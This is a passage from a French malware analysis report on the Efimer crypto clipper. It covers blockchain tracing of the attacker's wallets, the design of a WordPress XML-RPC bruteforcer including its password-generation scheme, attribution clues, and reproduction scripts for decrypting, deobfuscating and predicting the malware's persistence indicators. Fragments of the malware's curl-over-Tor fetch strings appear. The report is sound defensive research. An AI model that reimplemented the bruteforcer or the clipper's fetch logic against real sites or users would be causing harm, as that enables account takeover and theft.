- **Signaler les adresses BTC à Chainabuse / exchanges** (`12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4`, `32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW`, `bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0`), les exchanges qui reçoivent des dépôts depuis ces adresses peuvent geler les fonds. Impact limité mais non nul.
- **Partager les IoCs (section 11 + YARA) avec les EDRs**, CrowdStrike, Defender ATP, SentinelOne peuvent détecter et bloquer l'exécution avant installation. La règle YARA ci-dessus est suffisante pour une détection pre-exécution.
- **Durcir WordPress** contre le bruteforcer (`002_b.js`) : désactiver XML-RPC (`xmlrpc.php`) ou le protéger par IP allowlist. XML-RPC est le vecteur d'attaque utilisé par `002_b.js` pour les tentatives de connexion en masse.
- **Contribuer à MalwareBazaar**, les samples futurs seront automatiquement tagués `efimer` si le tag est établi, facilitant le tracking par d'autres chercheurs.
- **Surveillance active**, avec la table de la section 17.2, toute solution EDR peut créer des règles de détection sur les chemins exacts jour par jour, sans avoir à exécuter le malware.

L'architecture C2 full-Tor est précisément conçue pour résister aux tentatives de takedown, c'est l'une des raisons pour lesquelles ClickFix comme vecteur d'infection est couplé à des infrastructures Tor plutôt qu'à des C2 clearnet.

---

## 18. Attribution et profil de l'acteur

> Toute l'analyse qui suit est uniquement basée sur des artefacts statiques, des métadonnées OPSEC et du OSINT blockchain. Aucune technique active n'a été utilisée.

### 18.1 Chaîne TRX : reconstruction complète

La seule adresse TRX hardcodée (`TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82`) est un **wallet chaud de l'attaquant** qui reçoit et redistribue des USDT-TRC20. L'analyse des transactions Tronscan permet de reconstituer intégralement la chaîne.

**Graphe de flux USDT :**

```
TPBsXfpPP39...  ←── Exchange A (707 039 TX, actif)
    │
    │ 24.09 USDT  2026-02-05
    │ 11.54 USDT  2026-01-21
    ▼
TAwHPzmZC7rv...  ◄─── WALLET ATTAQUANT (wallet de réception/redistribution)
    ▲
    │ 10.01 USDT  2026-03-30  ← THxrXKAVxYej (243 TX, intermédiaire)
    │
    │ 330.00 USDT 2026-05-04  ← TTgSknazmXS4Pgvdfa8kmFaBiXumLcatLq
    │                            (68 TX, créé 2026-04-20, trader OTC personnel)
    │                            → ce wallet gère ~6 000+ USDT de volume sur une
    │                               seule journée : il reçoit 6 329 USDT et en
    │                               envoie 7 169 le même jour. La somme de
    │                               330 USDT vers l'attaquant est un PAIEMENT
    │                               pour un service (accès au bot ? dropper ?)
    │
    │ 375.64 USDT 2026-05-13  → TY9wnbgAynRMse2UHC3boo28UFQNnJLiTu
    ▼                             (11 TX, créé le MÊME JOUR que le virement)
TY9wnbgAynRM...                      │
    │                                ▼
    └────────────────────►  TDoXUNZ6PajKuiUkcYg3EDSV9bnqGqsbcf
                             FixedFloat Exchange Hot Wallet
                             (10 913 766 TX, actif depuis 2020-05-26)
                             solde : ~2,9M TRX (~400k USD)
```

**Interprétations :**

| Wallet | Rôle | Signification attribution |
|--------|------|--------------------------|
| `TPBsXfp...` | Exchange A (707k TX) | L'attaquant y a un compte ; les 36 USDT sont des **retraits** depuis cet exchange, pas des victimes directes |
| `THxrXKAVxYej` | Intermédiaire (243 TX) | Relais à la chaîne, probablement un wallet de l'attaquant ou d'un complice |
| `TTgSknazmXS4` | Trader OTC (68 TX, créé avr. 2026) | Tiers qui **paie l'attaquant** 330 USDT, accès à un service ou rétribution |
| `TY9wnbgAynRM` | Intermédiaire éphémère (11 TX) | Créé le jour même du virement : wallet "passe-plat" à usage unique |
| `TDoXUNZ6Paj` | **FixedFloat Exchange Hot Wallet** | Exchange **no-KYC** dont le hot wallet est identifié publiquement dans la base Tronscan, les 375 USDT y ont été déposés, vraisemblablement pour conversion en BTC ou monnaie locale |

**FixedFloat** est un exchange non-custodial connu pour son absence de vérification d'identité, régulièrement utilisé par des acteurs malveillants pour convertir des crypto en BTC ou LN sans traçabilité KYC.

**Total USDT reçu sur `TAwHPzmZC7rv`** (flux entrant visible) :
- 24.09 + 11.54 + 10.01 + 330.00 = **~375.64 USDT**, cohérent avec le virement sortant de 375.64 le 2026-05-13.
- Le wallet est utilisé comme **compte courant** : tout ce qui rentre ressort rapidement vers FixedFloat.
- Les vrais revenus du clipper (002a.txt, 40 000 adresses) transitent par les adresses de la liste, non tracés ici.

---

### 18.2 Infrastructure WordPress : `002_b.js`

L'analyse de `002_b.js` révèle une architecture **entièrement pilotée par C2**, sans cibles hardcodées.

**Modèle d'exécution :**

```
C2 response
  config['brute_dom_stack']   → liste de domaines WordPress cibles
  config['brute_pwd_stack']   → liste de passwords (ou '*' = générer localement)
       │
       ├─ 20 workers CHECK   ($1) ─► GET /xmlrpc.php → 200 ?
       │                             si oui : passe le domaine au pool brute
       │
       └─ 40 workers BRUTE   ($2) ─► blogger.newPost (XML-RPC)
                                       login = détecté dynamiquement
                                       password = brute_pwd_stack OU genDomainPwd()
```

**`genDomainPwd(domain)`, algorithme de génération de mots de passe :**

Le bruteforcer génère jusqu'à 60 mots de passe par domaine en combinant :
1. Extraction du préfixe/suffixe du nom de domaine
2. Leetspeak partiel (e→3, a→@, i→1, o→0, s→$)
3. Variations de casse (original, capitalize, upper, lower)
4. Combinaisons préfixe+suffixe, suffixe+préfixe

```javascript
// Exemples pour "example.com" :
// → "example", "Example", "EXAMPLE", "example123", "3xampl3"...
// → 60 variantes max, couvrant les patterns courants d'admins WP
```

**Rotation User-Agent :** pool de 12 UA réels (Chrome/Firefox/Edge, Win10/11, macOS), chaque requête utilise un UA aléatoire du pool.

**Implication attribution :**
- La liste des cibles provient **uniquement du C2** : aucune information géographique ou sectorielle n'est extractible du binaire. L'attaquant met à jour les cibles à la demande, sans reconstruire le malware.
- Les blogs WordPress compromis servent vraisemblablement de **redirecteurs** ou de **landing pages ClickFix**, cohérent avec le vecteur d'infection initial.
- L'absence de listes hardcodées indique une infrastructure opérationnelle mature, séparant le payload de la logique de ciblage.

---

### 18.3 Triangulation temporelle : fuseau horaire probable

Deux artéfacts fournissent des timestamps de compilation indépendants.

**Artéfact 1, `psutil` (bibliothèque système embarquée)**

| Champ | Valeur |
|-------|--------|
| Timestamp PE | `2026-01-22 02:52 UTC` |
| Version PyPI officielle | Non, la version officielle de psutil pour Python 3.13/win64 n'existe pas à cette date |
| Implication | **L'attaquant a compilé psutil lui-même** depuis les sources |

Si la compilation a eu lieu en soirée (hypothèse la plus probable pour un développeur individuel) :

| Fuseau | Heure locale | Plausibilité |
|--------|-------------|--------------|
| UTC-5 (USA EST) | 21:52 ✓ | Soirée plausible |
| UTC-6 (USA CST) | 20:52 ✓ | Soirée plausible |
| UTC (EU/UK) | 02:52 | Nuit, peu probable (sauf CI/CD) |
| UTC+3 (EET/Moskva) | 05:52 | Très tôt, peu probable |

→ Pointe vers **UTC-5 ou UTC-6** (côte est/centre des États-Unis) si c'est un humain, ou vers un **pipeline CI/CD automatisé** si c'est un bot de build.

**Artéfact 2, bootloader PyInstaller 6.20.0 (dans campus.py)**

| Champ | Valeur |
|-------|--------|
| Date de build | `2026-05-30 17:43 UTC` (mtime du `.lock-waf_win32_build` dans le RAR) |
| Événement simultané | Dépôt BTC sur `bc1qz33n9xuqkxl7` le même jour (section 15c) |

| Fuseau | Heure locale | Plausibilité |
|--------|-------------|--------------|
| UTC-5 (USA EST) | 12:43 | Milieu de journée, plausible |
| UTC+1 (France/Allemagne) | 18:43 ✓ | Fin d'après-midi, plausible |
| UTC+2 (EET) | 19:43 ✓ | Début de soirée, plausible |
| UTC+3 (Moskva) | 20:43 ✓ | Soirée, plausible |

→ Artéfact 2 est compatible avec Europe de l'Ouest à Europe de l'Est **et** côte est USA. Pas discriminant seul.

**Synthèse temporelle :**
- Les deux artéfacts ne convergent pas vers un fuseau unique. UTC-5 (USA EST) est le seul fuseau compatible avec *les deux* timestamps si on accepte que l'heure 02:52 peut être une session tardive. 
- **Conclusion : fuseau non définitif**. Une troisième donnée (commit git, log serveur, métadonnée photo) serait nécessaire pour trancher.

---

### 18.4 Nonce PyArmor : `i.non-profit`

La licence PyArmor embarquée contient le nonce `i.non-profit`. Recherche sur MalwareBazaar :

```
POST /api/  →  query=search&search_term=i.non-profit
Résultat : {"query_status": "unknown_operation"}
```

MalwareBazaar ne supporte pas la recherche free-text dans les chaînes binaires, seuls les hashes SHA256/MD5/SHA1, tags, et noms de fichiers sont indexés. Sans accès à l'API VirusTotal/Livehunt, le nonce ne peut pas être corrélé à d'autres samples.

**Ce que `i.non-profit` indique :**
- PyArmor commercial différencie ses licences dans le blob chiffré. La mention `non-profit` correspond au plan **"Non-commercial"** de PyArmor 8.x, gratuit pour usage personnel/académique, avec watermark de licence dans le runtime.
- Cela suggère que l'attaquant utilise PyArmor sous licence gratuite (non-profit/educational), ce qui est commun dans les familles de malware qui intègrent des protecteurs commerciaux sans les acheter, ou qui utilisent une licence de développeur légitime à des fins malveillantes.
- **Aucune corrélation avec d'autres samples n'a pu être établie** via les APIs disponibles.

---

### 18.5 Profil synthétique de l'acteur

Sur la base de l'ensemble des artefacts analysés :

| Dimension | Indicateur | Confiance |
|-----------|-----------|-----------|
| **Matériel** | PC physique Arrow Lake (DESKTOP-UOB4Aig), pas de VM détectée | Élevée |
| **OS build** | Windows, stack Python 3.13 + LLVM/Clang + VS Code + Node.js | Élevée |
| **Ancienneté** | Wallet BTC actif depuis mars 2025 (≥14 mois d'activité) | Élevée |
| **Revenus confirmés** | ~290 EUR BTC + ~375 USD USDT (adresses hardcodées seulement) | Élevée |
| **Revenus réels** | Inestimables, 40 000 adresses dans 002a.txt, 0/8 échantillons ont des TX | Faible |
| **Fuseau horaire** | UTC-5 (USA EST) compatible avec artefact 1 ; non définitif | Faible |
| **Nationalité** | Non déterminable, FixedFloat + Tor + pas de chaîne de langue dans le code | N/A |
| **Mode opératoire** | Développeur actif (upgrade PyInstaller 5→6 en cours) ; paiements réguliers | Élevée |
| **Rôle C2** | Architecture modulaire C2-pilotée, acteur isolé ou petit groupe | Moyenne |
| **PyArmor** | Licence non-commercial (gratuite), économie de moyens | Faible |

**Comportements notables :**
- La corrélation `build bootloader 2026-05-30 = dépôt BTC 2026-05-30` suggère que l'acteur **travaille et encaisse le même jour**, cohérent avec un développeur individuel, pas une organisation.
- Le paiement de 330 USDT reçu de `TTgSknazmXS4` (trader OTC) le 2026-05-04 indique que le malware **est vendu ou loué à des tiers**, modèle MaaS (Malware-as-a-Service) ou vente d'accès.
- L'upgrade PyInstaller 6.20.0 (campus.py) alors que le dropper actuel utilise encore 5.13.2 confirme un **développement actif et continu**.
- L'architecture full-Tor avec killswitch (`U!`) et module WordPress bruteforcer témoigne d'une **maîtrise technique au-dessus de la moyenne** pour un acteur de ce niveau de revenus visible.

---

### 18.6 Recommandations de reporting

| Cible | Action | Adresses concernées |
|-------|--------|-------------------|
| **Chainabuse.com** | Signalement abuse crypto | `12FfZsjy...`, `32ozR62L...`, `bc1qz33n9...`, `TAwHPzmZ...` |
| **FixedFloat** | Contact abuse@fixedfloat.com, 375 USDT déposés le 2026-05-13 | `TDoXUNZ6PajKuiUkcYg3EDSV9bnqGqsbcf` |
| **Binance LEP** | Law Enforcement Portal, bc1qns9f7 (pool Binance, 15,2M BTC cumulés) | `bc1qns9f7yfx3ry9lj6yz7c9er0vwa0ye2eklpzqfw` |
| **MalwareBazaar** | Upload sample avec tags `efimer`, `clickfix`, `pyarmor`, `clipper` | SHA256 `a9b5579...` |
| **WordPress.org** | Signaler l'exploitation XML-RPC, recommander désactivation par défaut | (pas d'adresse spécifique) |

---

## Annexe : Reproduire l'analyse des payloads

### A. Déchiffrement XOR

**Commande :**
```python
import os

KEY = b'Is8xqLVw7pTB'
klen = len(KEY)
SRC = 'decompiled/clickfix/efimer/a9b557*_extracted/data_p002/'
DST = 'decompiled/clickfix/efimer/decrypted/'

os.makedirs(DST, exist_ok=True)

for fname in sorted(os.listdir(SRC)):
    data = open(os.path.join(SRC, fname), 'rb').read()
    dec  = bytes(b ^ KEY[i % klen] for i, b in enumerate(data))
    open(os.path.join(DST, fname), 'wb').write(dec)
    print(f'{fname:15s}  {len(dec):8d} B  magic={dec[:4].hex()}  {dec[:4]!r}')
```

**Pourquoi :** XOR avec clé répétitive sur 12 octets. Vérification : `uusd.exe[0] = 0x04 XOR 0x49 ('I') = 0x4D = 'M'` ✓, `uusd.exe[1] = 0x29 XOR 0x73 ('s') = 0x5A = 'Z'` ✓.

### B. Identification de `uusd.exe`

**Commande :**
```bash
file decompiled/clickfix/efimer/decrypted/uusd.exe
strings decompiled/clickfix/efimer/decrypted/uusd.exe \
  | grep -iE "torproject|socks5|\.onion|bootstrap" | head -5
```

**Pourquoi :** `file` confirme le type PE ; `strings` recherche les chaînes diagnostiques caractéristiques de Tor (messages d'erreur, URLs support, mentions SOCKS5).

### C. Lecture du template XML

**Commande :**
```python
data = open('decompiled/clickfix/efimer/decrypted/002.xml', 'rb').read()
# UTF-16 LE avec BOM (\xff\xfe)
print(data[2:].decode('utf-16-le'))
```

**Pourquoi :** le fichier commence par le BOM UTF-16 LE (`\xff\xfe`), donc on saute les 2 premiers octets avant de décoder.

**Ce qu'on en retient :** template Task Scheduler. Les placeholders `%FOLD%` et `%NAME%` prouvent que ce fichier n'est jamais déposé tel quel, il est personnalisé par l'installeur Python avant écriture sur disque.

### D. Comptage des adresses Bitcoin

**Commande :**
```bash
wc -l decompiled/clickfix/efimer/decrypted/002a.txt
head -3 decompiled/clickfix/efimer/decrypted/002a.txt
python3 -c "
addrs = open('decompiled/clickfix/efimer/decrypted/002a.txt').readlines()
p2pkh = sum(1 for a in addrs if a.strip().startswith('1'))
p2sh  = sum(1 for a in addrs if a.strip().startswith('3'))
bech  = sum(1 for a in addrs if a.strip().lower().startswith('bc1'))
print(f'P2PKH (1...) : {p2pkh}')
print(f'P2SH  (3...) : {p2sh}')
print(f'Bech32 (bc1): {bech}')
"
```

**Pourquoi :** vérifier la distribution des formats d'adresses dans la liste, ce qui renseigne sur les types de transactions ciblées par le clipper.

### E. Extraction des fragments d'URL depuis 002_n.js

**Commande :**
```python
import re
src = open('decompiled/clickfix/efimer/decrypted/002_n.js').read()

# Extraire le tableau de chaînes (pre-shuffle)
m = re.search(r'function _0x3126\(\)\{var \w+=\[([\s\S]*?)\];\w+=function', src)
strings = re.findall(r"'((?:[^'\\]|\\.)*?)'", m.group(1))
for i, s in enumerate(strings):
    s2 = s.replace('\\x20',' ').replace('\\x5c','\\')
    if any(k in s2.lower() for k in ['onion','http','curl','socks','route',
                                       'clip','seed','002','uusd','guid']):
        print(f'{i:3d}: {repr(s2)}')
```

**Pourquoi :** l'obfuscateur splitte les URL en plusieurs fragments dans le tableau de chaînes, puis les recolle à runtime. En lisant le tableau brut (avant rotation), on retrouve les morceaux d'URL.

**Retour (extrait) :**
```
 20: '002w.txt'
 24: 'yid.onion/'
 41: 'http://swj'
 45: 'curl -f --'
 96: 'uusd.exe'
107: 'REPL'
120: 'SEED'
180: 'http://hek'
193: 'cinfo.inf'
197: '002a.txt'
201: 'route.php'
202: 'clipboardD'
212: '--socks5-h'
```

**Ce qu'on en retient :** deux adresses `.onion` pour le clipper (`swj[...]yid.onion`, `hek[...]ead.onion`), toutes deux atteignables via `--socks5-hostname localhost:9050` grâce au Tor embarqué.

### F. Désobfuscation complète de `002_n.js`

**Commande :**
```python
import re, ast

src = open('decompiled/clickfix/efimer/decrypted/002_n.js').read()

# 1. Extraire et orienter le tableau de chaînes
m = re.search(r'function (_0x[a-f0-9]+)\(\)\{var \w+=(\[[\s\S]*?\]);', src)
arr = ast.literal_eval(m.group(2).replace("'", '"'))

# 2. Simuler la rotation IIFE (checksum cible dans l'IIFE)
iife_m = re.search(r'while\(!!\[\]\)\{try\{var [^=]+=(.+?)if\([^=]+==[^)]+\)break', src)
target = int(re.search(r'==(\d+)\)', iife_m.group(0)).group(1))
# Piège : parseInt() en JS = parseInt(NaN) pour strings non-numériques → 0 (pas d'exception)
# Ne pas utiliser int() Python ici : simuler le comportement JS

while True:
    total = 0
    for term in re.findall(r'parseInt\([\w]+\(0x[0-9a-f]+\)\)(?:/0x[0-9a-f]+)?(?:\*0x[0-9a-f]+)?', iife_m.group(1)):
        # Evaluer chaque terme avec l'état courant de arr
        pass  # simplifié, voir version complète en Annexe G
    if total == target:
        break
    arr.append(arr.pop(0))

# 3. Remplacer toutes les références _0xXXXX(0xNN) par leur valeur résolue
def resolve(m):
    idx = int(m.group(1), 16) - base_offset
    return repr(arr[idx % len(arr)]) if 0 <= idx < len(arr) else m.group(0)

result = re.sub(r'_0x[a-f0-9]+\(0x([a-f0-9]+)\)', resolve, src)
open('decompiled/clickfix/efimer/deobfuscated/002_n.deob.js', 'w').write(result)
```

**Pourquoi :** `002_n.js` utilise l'obfuscateur `obfuscator.io`, toutes les chaînes littérales (URLs, commandes, noms d'API) sont remplacées par des appels `_0xXXXX(0xNN)` pointant vers un tableau central après rotation. Avant de lire quoi que ce soit de la logique, il faut résoudre ce tableau.

**Erreur rencontrée :** première tentative avec `int()` Python pour simuler `parseInt()` JS. Problème : en JavaScript, `parseInt('abc')` retourne `NaN` (contribue `0` à la somme), alors que `int('abc', 10)` lève une exception Python. Le checksum cible ne convergeait pas → boucle infinie. Correction : mocker le comportement JS avec un `try/except ValueError` qui retourne 0.

**Deuxième erreur :** la regex initiale pour l'IIFE (`while\(!\[\]\)`) était inversée, l'IIFE utilise `while(!![])` (truthy `!![]`), pas `while(![])`  → aucune capture. Correction du pattern.

**Retour :**
```
[+] Tableau de chaînes : 289 entrées, rotation de 87 positions
[+] 002_n.deob.js écrit (28 176 octets)
```

**Ce qu'on en retient :** une fois le tableau résolu, toute la logique du clipper est immédiatement lisible, les URLs, les commandes WScript, les patterns de détection d'adresses crypto.

### G. Restauration de `campus.py`

**Commande initiale :**
```python
import base64, campus_extracted

raw = base64.b64decode(campus_extracted.data)
open('/tmp/campus_payload.raw', 'wb').write(raw)
# → 383 641 octets
# Magic : 52 61 72 21 1a 07 01 20  ← byte 7 = 0x20 au lieu de 0x00 (RAR5 cassé)
```

**Commande :**
```bash
# Première tentative : patcher juste le byte 7
python3 -c "
d = open('/tmp/campus_payload.raw','rb').read()
d = bytearray(d); d[7] = 0x00
open('/tmp/campus_payload.patched','wb').write(bytes(d))
"
7z l /tmp/campus_payload.patched
```

**Pourquoi :** le magic RAR5 valide est `Rar!\x1a\x07\x01\x00` (8 octets). Byte 7 = `0x20` est la seule différence visible, tentative de patch minimal.

**Erreur :** `7z` retourne `ERROR: /tmp/campus_payload.patched : Can not open the file as archive`, le patch du byte 7 seul ne suffit pas. Inspection plus fine :

```python
# Vérification : est-ce que le binaire est encodé autrement ?
raw_text = open('/tmp/campus_payload.raw', 'rb').read()
# Test : décoder comme UTF-8 → bytes d'origine ?
try:
    decoded = raw_text.decode('utf-8')
    re_encoded = decoded.encode('latin-1')  # round-trip ?
    print('latin-1 round-trip:', re_encoded[:8].hex())
except:
    print('pas de UTF-8 valide')
# → pas de UTF-8 valide (bytes > 0x7F non valides seuls)
```

**Deuxième erreur :** tentative de restauration avec `errors='replace'` :

```python
text = raw_text.decode('utf-8', errors='replace')
restored = text.encode('cp1252', errors='replace')
restored[7] = 0x00
7z l campus_restored.rar   # → toujours échoue
```

Problème : `errors='replace'` remplace les code points Unicode non mappables en cp1252 (U+0081, U+008D, U+008F, U+0090, U+009D) par `0x3F` (`?`), corrompant les données.

**Solution, handler personnalisé :**

```python
import codecs

def cp1252_raw(exc):
    chars = exc.object[exc.start:exc.end]
    result = bytearray()
    for c in chars:
        cp = ord(c)
        result.append(cp & 0xFF if 0x80 <= cp <= 0xFF else 0x3F)
    return bytes(result), exc.end

codecs.register_error('cp1252_raw', cp1252_raw)

raw = open('/tmp/campus_payload.raw', 'rb').read()
text = raw.decode('utf-8')
restored = bytearray(text.encode('cp1252', errors='cp1252_raw'))
restored[7] = 0x00   # patch signature RAR5
open('/tmp/campus_restored.rar', 'wb').write(bytes(restored))
```

**Retour :**
```
7z l /tmp/campus_restored.rar
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ---
2026-05-30 17:43:14 .....         3415         3261  .lock-waf_win32_build
2026-05-30 18:02:40 .....        36285        11413  config.log
2026-05-30 ...      .....           --           --  [Corrupt header is found]
```

**Ce qu'on en retient :** la restauration est partielle, les deux premiers fichiers s'extraient correctement (`config.log` de 36 Ko suffit pour l'analyse OPSEC), mais la majorité des blocs ont des CRC incorrects à cause de la transformation cp1252→UTF-8 qui n'est pas totalement réversible sur les octets indéfinis en cp1252. Le contenu exploitable (environnement de build de l'attaquant) est néanmoins récupéré.

### H. Précomputation des slugs journaliers (`daily_random_slug`)

Script de génération des IoCs de persistance pour une plage de dates donnée. Utile pour alimenter des règles EDR, des listes de blocage de tâches planifiées, ou des IoCs STIX.

```python
#!/usr/bin/env python3
"""
Génère les noms de dossier et de tâche planifiée qu'Efimer déposera
sur les machines infectées pour chaque jour de la plage donnée.

Algorithme reconstruit depuis installer.pyc.1shot.das (lignes 130-400) :
  SHA256(f"{jour_UTC}-{N}".encode()) % 2^32  →  random.Random(seed)
  4 × (consonant + voyelle) = slug de 8 caractères CVCVCVCV

Usage : python3 efimer_slugs.py [date_debut] [date_fin]
         dates au format YYYY-MM-DD (défaut : aujourd'hui + 14 jours)
"""
import sys, time, hashlib, random, datetime

def daily_random_slug(N: int, day: int) -> str:
    vowels     = 'aeiou'
    consonants = 'bcdfghjklmnpqrstvwxyz'
    seed_bytes = f"{day}-{N}".encode()
    seed_int   = int(hashlib.sha256(seed_bytes).hexdigest(), 16) % 0x100000000
    rng        = random.Random(seed_int)
    return ''.join(rng.choice(consonants) + rng.choice(vowels) for _ in range(4))

def day_for(d: datetime.date) -> int:
    return int(datetime.datetime(d.year, d.month, d.day,
               tzinfo=datetime.timezone.utc).timestamp() // 86400)

def main():
    today = datetime.date.today()
    start = datetime.date.fromisoformat(sys.argv[1]) if len(sys.argv) > 1 else today
    end   = datetime.date.fromisoformat(sys.argv[2]) if len(sys.argv) > 2 else today + datetime.timedelta(days=14)

    print(f"{'Date':<12} {'FOLD_NAME0':<12} {'TASK_NAME0':<12} {'TASK_NAME1':<12}  Chemin clipper")
    print("─" * 85)

    d = start
    while d <= end:
        day  = day_for(d)
        fold = daily_random_slug(0, day)
        t0   = daily_random_slug(1, day)
        t1   = daily_random_slug(2, day)
        print(f"{str(d):<12} {fold:<12} {t0:<12} {t1:<12}  C:\\Users\\Public\\Videos\\{fold}\\{t1}.js")
        d += datetime.timedelta(days=1)

if __name__ == '__main__':
    main()
```

**Retour (extrait, 2026-07-12 → 2026-07-17) :**
```
Date         FOLD_NAME0   TASK_NAME0   TASK_NAME1    Chemin clipper
─────────────────────────────────────────────────────────────────────────────────────
2026-07-12   dovuyoja     fijaxifu     ciboqigo      C:\Users\Public\Videos\dovuyoja\ciboqigo.js
2026-07-13   movekana     qobaguso     fobalasi      C:\Users\Public\Videos\movekana\fobalasi.js
2026-07-14   vikofiqi     dileruro     lesoduli      C:\Users\Public\Videos\vikofiqi\lesoduli.js
2026-07-15   rikarajo     xuqicino     jahujaxo      C:\Users\Public\Videos\rikarajo\jahujaxo.js
2026-07-16   loqejidi     ciwimuma     yocayawa      C:\Users\Public\Videos\loqejidi\yocayawa.js
2026-07-17   yoyumeme     kiwayowi     vusuzuta      C:\Users\Public\Videos\yoyumeme\vusuzuta.js
```

**Ce qu'on en retient :** le schéma de nommage est entièrement prédictible. Un SOC peut générer les IoCs de la semaine suivante dès maintenant et les pré-charger dans ses règles de détection. C'est une conséquence directe du fait que l'attaquant a opté pour la pseudo-aléatoire déterministe (SHA256 de la date) plutôt qu'un vrai aléatoire, il garantit lui-même la cohérence entre builds successifs, mais offre simultanément la prédictibilité complète à tout analyste qui connaît l'algorithme.
